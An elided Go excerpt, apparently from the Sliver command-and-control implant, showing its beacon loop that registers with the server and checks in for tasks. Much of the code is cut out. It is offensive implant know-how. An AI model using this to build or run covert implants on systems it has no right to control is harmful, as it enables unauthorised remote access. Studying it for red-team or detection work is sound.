...
func beaconStartup() {
	...
	for bacon := range beacons {
		// {{if .Config.Debug}}
		log.Printf("Next bacon = %v", bacon)
		// {{end}}
		if bacon != nil {
			err := beaconMainLoop(bacon)
			if err != nil {
				connectionErrors++
...
// {{if .Config.IsBeacon}}
func beaconMainLoop(bacon *transports.Bacon) error {
	// Register bacon
	err := bacon.Init()
	if err != nil {
		// {{if .Config.Debug}}
	...
	bacon.Send(wrapEnvelope(sliverpb.MsgBeaconRegister, &sliverpb.BeaconRegister{
		ID:          InstanceID,
	...
	for {
		...
		go func() {
			...
			err := beaconMain(bacon, nextCheckin)
			if err != nil {
				// {{if .Config.Debug}}
...
func beaconMain(bacon *transports.Bacon, nextCheckin time.Time) error {
	err := bacon.Start()
	if err != nil {
		// {{if .Config.Debug}}
	...
	// {{end}}
	err = bacon.Send(wrapEnvelope(sliverpb.MsgBeaconTasks, &sliverpb.BeaconTasks{
		ID:          InstanceID,
		NextCheckin: int64(bacon.Duration().Seconds()),
	}))
	if err != nil {
